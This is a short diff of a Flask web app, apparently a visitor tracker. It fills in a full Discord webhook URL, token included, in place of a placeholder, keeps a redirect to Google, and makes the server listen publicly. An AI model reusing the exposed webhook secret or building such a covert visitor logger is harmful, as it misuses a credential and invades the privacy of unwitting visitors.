@@ -4,7 +4,7 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-WEBHOOK_URL = 'ضع_رابط_الويب_هوك_هنا'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1342881017857314926/hRDHXvaYk9k60Rnsc_YL-OPSQqebZ3RtMZVcb3diXEQcyL5CXYWXnuFwMkIqUnaJ8phn'
 REDIRECT_DESTINATION = "https://www.google.com" # الموقع الذي سيتم نقل الشخص إليه
 
 @app.route('/')
@@ -34,5 +34,6 @@ def index():
     return render_template('index.html')
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=5000)
   
+
